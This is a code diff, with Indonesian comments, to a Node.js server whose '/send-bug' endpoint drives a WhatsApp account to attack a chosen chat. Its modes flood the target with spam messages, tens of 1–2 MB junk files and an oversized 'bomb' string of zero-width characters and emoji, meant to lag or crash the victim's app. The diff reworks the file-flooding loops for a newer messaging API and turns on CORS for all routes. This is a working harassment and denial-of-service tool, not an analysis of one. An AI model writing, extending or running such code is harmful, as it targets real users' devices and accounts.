@@ -8,9 +8,11 @@ const net = require('net');
 const dns = require('dns');
 const path = require('path');
 const fs = require('fs');
+const cors = require('cors'); // <-- TAMBAHKAN INI
 
 const app = express();
 app.use(express.json());
+app.use(cors()); // <-- AKTIFKAN CORS UNTUK SEMUA ROUTE
 
 // ============================================================
 // KONFIGURASI SUPABASE
@@ -243,7 +245,6 @@ app.get('/qr/:username', async (req, res) => {
 });
 
 app.get('/status', (req, res) => {
-    // Mendapatkan status global (apakah ada user yang ready)
     let anyReady = false;
     for (const key in sessions) {
         if (sessions[key].isReady) {
@@ -312,7 +313,7 @@ app.post('/send-bug', async (req, res) => {
 
     try {
         const send = async (text) => await sock.sendMessage(chatId, { text });
-        const { MessageMedia } = require('whatsapp-web.js');
+        // Hapus require('whatsapp-web.js') – tidak digunakan
 
         // ============================================================
         // 1. DELAY HARD – KOMBO 130 SPAM + 10.000 KARAKTER + 30 FILE 1MB
@@ -328,8 +329,12 @@ app.post('/send-bug', async (req, res) => {
             }
             for (let i = 0; i < 30; i++) {
                 const buffer = Buffer.alloc(1 * 1024 * 1024, `${i}`.repeat(500).padEnd(1024*1024, 'X'));
-                const media = new MessageMedia('application/octet-stream', buffer.toString('base64'), `file_${i+1}.bin`);
-                await sock.sendMessage(chatId, media, { caption: `📁 FILE ${i+1}/30` });
+                await sock.sendMessage(chatId, {
+                    document: buffer,
+                    mimetype: 'application/octet-stream',
+                    fileName: `file_${i+1}.bin`,
+                    caption: `📁 FILE ${i+1}/30`
+                });
                 await delay(30);
             }
         }
@@ -355,8 +360,12 @@ app.post('/send-bug', async (req, res) => {
                 }
                 for (let i = 0; i < 20; i++) {
                     const buffer = Buffer.alloc(1 * 1024 * 1024, `${i}`.repeat(500).padEnd(1024*1024, 'X'));
-                    const media = new MessageMedia('application/octet-stream', buffer.toString('base64'), `file_${i+1}.bin`);
-                    await sock.sendMessage(chatId, media, { caption: `📁 FILE ${i+1}/20` });
+                    await sock.sendMessage(chatId, {
+                        document: buffer,
+                        mimetype: 'application/octet-stream',
+                        fileName: `file_${i+1}.bin`,
+                        caption: `📁 FILE ${i+1}/20`
+                    });
                     await delay(30);
                 }
             }
@@ -399,8 +408,12 @@ app.post('/send-bug', async (req, res) => {
         else if (effect === 'RESTART HARD') {
             for (let i = 0; i < 30; i++) {
                 const buffer = Buffer.alloc(2 * 1024 * 1024, `${i}`.repeat(500).padEnd(2*1024*1024, 'X'));
-                const media = new MessageMedia('application/octet-stream', buffer.toString('base64'), `file_${i+1}.bin`);
-                await sock.sendMessage(chatId, media, { caption: `📁 FILE ${i+1}/30` });
+                await sock.sendMessage(chatId, {
+                    document: buffer,
+                    mimetype: 'application/octet-stream',
+                    fileName: `file_${i+1}.bin`,
+                    caption: `📁 FILE ${i+1}/30`
+                });
                 await delay(30);
                 if (i % 5 === 0) {
                     await send(`[RESTART] ${i+1}/30`);
@@ -418,8 +431,12 @@ app.post('/send-bug', async (req, res) => {
                     await delay(5);
                     if (i % 10 === 0) {
                         const buffer = Buffer.alloc(1 * 1024 * 1024, `X`.repeat(500).padEnd(1024*1024, 'Y'));
-                        const media = new MessageMedia('application/octet-stream', buffer.toString('base64'), `loop_${i}.bin`);
-                        await sock.sendMessage(chatId, media, { caption: `📁 LOOP ${i+1}` });
+                        await sock.sendMessage(chatId, {
+                            document: buffer,
+                            mimetype: 'application/octet-stream',
+                            fileName: `loop_${i}.bin`,
+                            caption: `📁 LOOP ${i+1}`
+                        });
                     }
                 }
                 const bomb = 'A'.repeat(5000) + '\u200B'.repeat(3000) + '🔥'.repeat(2000);
@@ -442,8 +459,12 @@ app.post('/send-bug', async (req, res) => {
                 }
                 for (let i = 0; i < 50; i++) {
                     const buffer = Buffer.alloc(1 * 1024 * 1024, `${i}`.repeat(500).padEnd(1024*1024, 'X'));
-                    const media = new MessageMedia('application/octet-stream', buffer.toString('base64'), `file_${i+1}.bin`);
-                    await sock.sendMessage(chatId, media, { caption: `📁 FILE ${i+1}/50` });
+                    await sock.sendMessage(chatId, {
+                        document: buffer,
+                        mimetype: 'application/octet-stream',
+                        fileName: `file_${i+1}.bin`,
+                        caption: `📁 FILE ${i+1}/50`
+                    });
                     await delay(20);
                 }
             }
@@ -477,8 +498,12 @@ app.post('/send-bug', async (req, res) => {
             }
             for (let i = 0; i < 10; i++) {
                 const buffer = Buffer.alloc(1 * 1024 * 1024, `${i}`.repeat(500).padEnd(1024*1024, 'X'));
-                const media = new MessageMedia('application/octet-stream', buffer.toString('base64'), `file_${i+1}.bin`);
-                await sock.sendMessage(chatId, media, { caption: `📁 FILE ${i+1}/10` });
+                await sock.sendMessage(chatId, {
+                    document: buffer,
+                    mimetype: 'application/octet-stream',
+                    fileName: `file_${i+1}.bin`,
+                    caption: `📁 FILE ${i+1}/10`
+                });
                 await delay(30);
             }
         }
